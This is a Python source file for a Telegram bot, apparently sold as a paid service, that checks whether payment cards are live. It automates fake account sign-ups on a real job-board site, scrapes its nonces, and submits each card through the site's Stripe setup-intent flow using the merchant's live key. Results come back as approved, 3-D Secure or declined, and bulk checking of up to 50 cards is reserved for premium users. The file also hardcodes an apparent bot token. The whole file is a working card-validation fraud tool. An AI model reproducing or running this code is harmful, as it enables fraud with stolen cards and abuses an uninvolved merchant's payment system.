import requests
import re
import random
import string
import json
import uuid
import time
import os
import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional

# Force UTF-8 encoding for Render
import sys
sys.stdout.reconfigure(encoding='utf-8')

# ANSI escape codes for colors
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# ============================================= CONFIGURATION =============================================
# Get these from Render Environment Variables
TOKEN = os.getenv('TELEGRAM_TOKEN', '7770017168:AAFQ8DUaoRcff3cSKQVf7qm1FfJOczpRIRg')
ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))

# File paths for Render (persistent storage)
AUTH_FILE = os.path.join(os.path.dirname(__file__), 'authorized.json')
DATA_DIR = os.path.dirname(__file__)

# Ensure data directory exists
os.makedirs(DATA_DIR, exist_ok=True)

# Ensure the authorized.json file exists
if not os.path.exists(AUTH_FILE):
    with open(AUTH_FILE, 'w', encoding='utf-8') as f:
        json.dump({}, f)

def g(): 
    return f"{''.join(random.choices(string.ascii_lowercase+string.digits,k=10))}@{random.choice(['gmail.com','yahoo.com'])}"

#============================================= CARD VALIDATION ========================================================
def check_card(card):
    try:
        parts = card.strip().split('|')
        if len(parts) != 4:
            return None

        cc, mon, yy, cvv = parts

        if not (cc.isdigit() and mon.isdigit() and yy.isdigit() and cvv.isdigit()):
            return None

        if len(cc) < 13 or len(cc) > 16:
            return None

        if not (1 <= int(mon) <= 12):
            return None

        if len(yy) == 2:
            yy = "20" + yy

        raz = cc[:6]

        return {
            "cc": cc,
            "mm": mon.zfill(2),
            "yy": yy,
            "cvv": cvv,
            "bin": raz
        }

    except Exception:
        return None
    
#============================================== BIN DATA =============================================
def get_bin_info(bin_num):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'Unknown'),
                'type': data.get('type', 'Credit'),
                'level': data.get('brand', 'Standard'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🇺🇸'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    return {'brand': 'Unknown', 'type': 'Credit', 'level': 'Standard', 'country': 'US', 'emoji': '🇺🇸', 'bank': 'Unknown Bank'}

#================================  CHECKING SCRIPT LOGIC ==============================
def run_automated_process(cc, cvv, yy, mon, user_ag, client_element, guid, muid, sid):
    session = requests.Session()
    session.headers.update({"User-Agent": user_ag})

    try:
        # Signup page
        r = session.get(u := "https://www.ecologyjobs.co.uk/signup/", timeout=10)
        m = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
        if not m:
            return {"status": "error", "response": "Nonce not found"}

        k = "pk_live_51PGynOHIJjZ53CoY9eYAetODZeX9tyaRMeasCAkcfl39Q1C27FAkZKPz0IbpzXZG8TAiBppG06vU48l87i53frxH00XZ9upWGP"

        # Register
        r2 = session.post(u, data={
            'email': g(),
            'mailchimp_woocommerce_newsletter': '1',
            'reg_role': 'employer,candidate',
            'woocommerce-register-nonce': m[1],
            '_wp_http_referer': '/signup/',
            'register': 'Register'
        }, timeout=10)

        if 'wordpress_logged_in_' not in str(session.cookies):
            return {"status": "error", "response": "Reg failed"}

        # Payment methods page
        p = session.get(u + "payment-methods/", timeout=10)
        n = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', p.text)
        if not n:
            return {"status": "error", "response": "Nonce not found"}

        # Create Stripe payment method
        pm = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': session.headers.get('User-Agent', '')
            },
            data={
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mon,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': '10080',
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
                'referrer': 'https://www.ecologyjobs.co.uk',
                'guid': str(uuid.uuid4()),
                'key': k,
                '_stripe_version': '2024-06-20'
            },
            timeout=10
        )

        try:
            pm_id = pm.json().get('id')
        except Exception:
            return {"status": "DECLINED🚫", "response": "Invalid Stripe response"}

        # Confirm setup intent
        r3 = session.post(
            'https://www.ecologyjobs.co.uk/wp-admin/admin-ajax.php',
            headers={
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.ecologyjobs.co.uk',
                'referer': u + 'payment-methods/',
                'user-agent': session.headers.get('User-Agent', ''),
                'x-requested-with': 'XMLHttpRequest'
            },
            data={
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': n[1]
            },
            timeout=10
        )

        response_text = r3.text
        status = "Unknown Error🚫"

        if r3.status_code == 200:
            if '"success":true' in response_text and '"status":"succeeded"' in response_text:
                status = "APPROVED✅"
            elif '"status":"requires_action"' in response_text:
                status = "3D SECURE🟡"
            elif 'Your card was declined.' in response_text:
                status = "DECLINED🚫"
            else:
                status = "DECLINED🚫"
        else:
            status = "DECLINED🚫"

        return {"status": status, "response": response_text}

    except requests.exceptions.RequestException:
        return {"status": "NETWORK_ERROR🚫", "response": "Connection timeout"}
    except Exception as e:
        return {"status": "ERROR🚫", "response": str(e)}

# ================================= TELEGRAM BOT FUNCTIONS ======================================

def get_user_status(user_id):
    try:
        with open(AUTH_FILE, 'r', encoding='utf-8') as f:
            auth_data = json.load(f)
        
        user_id_str = str(user_id)
        if user_id_str in auth_data:
            exp_date = datetime.fromisoformat(auth_data[user_id_str])
            if datetime.now() < exp_date:
                return exp_date
            else:
                del auth_data[user_id_str]
                with open(AUTH_FILE, 'w', encoding='utf-8') as f:
                    json.dump(auth_data, f)
        return 'FREE'
    except Exception:
        return 'FREE'

def extract_cards(update: Update):
    text = update.message.text
    command = text.split()[0]
    cards_text = text[len(command):].strip()
    cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    return cards

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_message = """*💳♨️ S T R I P E  A U T H ♨️💳*

🤓 *Heya*👋
❎ /st *→* Single Card Check (*Free*)
♻️ /mchk *→* Mass Check (*Premium*)
🆔 /info *→* Check User Status 
🖥 *Admin* *→* @rashunter44"""

    await update.message.reply_text(welcome_message, parse_mode="Markdown")

async def info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "🚫FREE" if status == "FREE" else "🎉PREMIUM"

    if USER == "🚫FREE":
        msg = "🚫 FREE USER ⚠️"
    else:
        days_left = (status - datetime.now()).days
        msg = f"🎉 PREMIUM USER ✅ → *{days_left}* Days Left!"

    await update.message.reply_text(msg, parse_mode="Markdown")

async def auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command🔐")
        return
    
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /auth telegram_ID days")
        return
    
    try:
        auth_user_id = int(args[0])
        days = int(args[1])
        exp_date = datetime.now() + timedelta(days=days)
        
        with open(AUTH_FILE, 'r+', encoding='utf-8') as f:
            auth_data = json.load(f)
            auth_data[str(auth_user_id)] = exp_date.isoformat()
            f.seek(0)
            json.dump(auth_data, f, ensure_ascii=False, indent=2)
            f.truncate()
        
        await update.message.reply_text(f"User {auth_user_id} authorized for {days} days ✅")
    except ValueError:
        await update.message.reply_text("Invalid arguments. Use numbers for ID and days.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def st_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "🚫FREE" if status == "FREE" else "🎉PREMIUM"

    cards = extract_cards(update)
    if len(cards) != 1:
        await update.message.reply_text("Provide a card: /st CC|MM|YY|CVV")
        return

    await update.message.reply_text("⏳ Please wait! Checking cc…")
    
    card = cards[0]
    card_data = check_card(card)

    if not card_data:
        await update.message.reply_text("❌ Invalid card format!")
        return

    result = run_automated_process(
        cc=card_data["cc"],
        mon=card_data["mm"],
        yy=card_data["yy"],
        cvv=card_data["cvv"],
        user_ag="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        client_element="client_" + str(random.getrandbits(64)), 
        guid=str(uuid.uuid4()),
        muid=str(uuid.uuid4()),
        sid=str(uuid.uuid4())
    )

    bin_info = card_data["bin"]
    status_result = result["status"]

    response = f"""✅ *STRIPE AUTH*
💳 `{card}`
♻️ Result → *{status_result}*
🌐 BIN → `{bin_info}`
👤 User → {USER}
🖥 Admin → @rashunter44"""

    await update.message.reply_text(response, parse_mode="Markdown")

async def mchk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "FREE" if status == "FREE" else "🎉PREMIUM"

    if USER == "FREE":
        await update.message.reply_text("🔐 Premium only!\nContact Admin → @rashunter44")
        return

    cards = extract_cards(update)

    if not cards:
        await update.message.reply_text("Provide cards like:\n/mchk CC|MM|YY|CVV (one per line)")
        return

    if len(cards) > 50:
        await update.message.reply_text("Maximum Limit 50")
        return

    await update.message.reply_text("⏳ Please wait! Checking cc…")

    for card in cards:
        card_data = check_card(card)

        if not card_data:
            await update.message.reply_text("❌ Invalid card format!")
            continue

        result = run_automated_process(
            cc=card_data["cc"],
            mon=card_data["mm"],
            yy=card_data["yy"],
            cvv=card_data["cvv"],
            user_ag="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            client_element="client_" + str(random.getrandbits(64)),
            guid=str(uuid.uuid4()),
            muid=str(uuid.uuid4()),
            sid=str(uuid.uuid4())
        )

        status_result = result["status"]
        bin_info = card_data["bin"]

        response = f"""✅ *STRIPE AUTH*
💳 `{card}`
♻️ Result → *{status_result}*
🌐 BIN → `{bin_info}`
👤 User → {USER}
🖥 Admin → @rashunter44"""

        await update.message.reply_text(response, parse_mode="Markdown")
        await asyncio.sleep(2)  # Rate limiting for Render

    await update.message.reply_text("✅ *All checks completed!*")

# ================================= MAIN APPLICATION =================================
if __name__ == '__main__':
    print(f"{GREEN}[+] Starting Stripe Auth Bot...{RESET}")
    print(f"{BLUE}[+] Admin ID: {ADMIN_ID}{RESET}")
    
    if TOKEN == '7770017168:AAFQ8DUaoRcff3cSKQVf7qm1FfJOczpRIRg':
        print(f"{RED}[!] Set TELEGRAM_TOKEN environment variable{RESET}")
        exit(1)
    
    if ADMIN_ID == 0:
        print(f"{RED}[!] Set ADMIN_ID environment variable{RESET}")
        exit(1)

    # Create Telegram application
    application = ApplicationBuilder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_handler))
    application.add_handler(CommandHandler("info", info_handler))
    application.add_handler(CommandHandler("auth", auth_handler))
    application.add_handler(CommandHandler("st", st_handler))
    application.add_handler(CommandHandler("mchk", mchk_handler))
    
    # Start polling with error handler
    print(f"{GREEN}[+] Bot started successfully! Press Ctrl+C to stop.{RESET}")
    
    try:
        application.run_polling(drop_pending_updates=True, timeout=30)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[+] Bot stopped by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Bot crashed: {e}{RESET}")
